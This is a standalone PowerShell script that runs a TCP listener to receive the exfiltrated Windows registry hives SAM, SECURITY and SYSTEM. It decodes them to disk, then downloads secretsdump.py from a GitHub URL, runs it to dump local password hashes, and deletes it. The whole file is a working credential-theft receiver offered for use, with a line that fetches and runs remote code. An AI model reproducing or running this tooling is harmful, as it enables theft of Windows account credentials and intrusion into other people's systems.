function Invoke-Reciever {
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    Write-Host
    Write-Host
    Write-Host Starting Server...

    $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
    $listener = new-object System.Net.Sockets.TcpListener $endpoint
    $listener.start()
    $byte1 = New-Object byte[] 1000000
    $byte2 = New-Object byte[] 1000000
    $byte3 = New-Object byte[] 50000000

    Write-Host Waiting For Connection...

    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()

    Write-Host Connected
    Write-Host
    Write-Host Recieveing Data...

    $bytes1 = $stream.read($byte1, 0, $byte1.Length)
    $stream.Write('0',0,1)
    $bytes2 = $stream.read($byte2, 0, $byte2.Length)
    $stream.Write('0',0,1)
    $bytes3 = $stream.read($byte3, 0, $byte3.Length)

    Write-Host Recieved all Data
    Write-Host
    Write-Host Starting Data Processing...
    Write-Host Processing SAM

    $msg1 += [text.encoding]::ASCII.GetString( (1..$bytes1 | ForEach-Object { $byte1[$_-1] } ) )
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SAM'), [Convert]::FromBase64String($msg1))

    Write-Host Processed SAM
    Write-Host Processing SECURITY

    $msg2 += [text.encoding]::ASCII.GetString( (1..$bytes2 | ForEach-Object { $byte2[$_-1] } ) )
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SECURITY'), [Convert]::FromBase64String($msg2))

    Write-Host Processed SECURITY
    Write-Host Processing SYSTEM

    $msg3 += [text.encoding]::ASCII.GetString( (1..$bytes3 | ForEach-Object { $byte3[$_-1] } ) )
    [IO.File]::WriteAllBytes((Join-Path (resolve-path './') '/SYSTEM'), [Convert]::FromBase64String($msg3))

    Write-Host Processed SYSTEM
    Write-Host
    Write-Host Finished Processing
    Write-Host
    Write-Host Stopping Server
    Write-Host

    $listener.Stop()
    $listener.Server.Dispose()

    Write-Host Dumping Hashes With secretsdump.py
    Write-Host
    Write-Host

    wget "http://raw.github.com/mo-tec/HashExtractor/master/secretsdump.py" -UseBasicParsing -out (Join-Path (resolve-path './') '/secretsdump.py')
    .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
    del ./secretsdump.py
}
Invoke-Reciever